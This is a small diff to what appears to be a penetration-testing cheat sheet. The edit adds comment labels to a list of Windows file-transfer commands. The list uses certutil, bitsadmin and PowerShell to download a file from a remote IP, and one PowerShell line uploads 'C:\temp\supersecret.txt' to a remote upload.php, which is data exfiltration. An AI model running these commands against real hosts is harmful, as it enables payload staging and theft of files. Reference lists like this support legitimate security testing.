@@ -64,7 +64,11 @@ Windows :
 ```bash
 certutil -urlcache -f http://192.168.31.141/ignite.txt ignite.txt
 bitsadmin /transfer job http://192.168.31.141/ignite.txt C:\Users\Public\ignite.txt
+
+#Download file 
 powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')
+
+#Upload file
 powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"
 
 
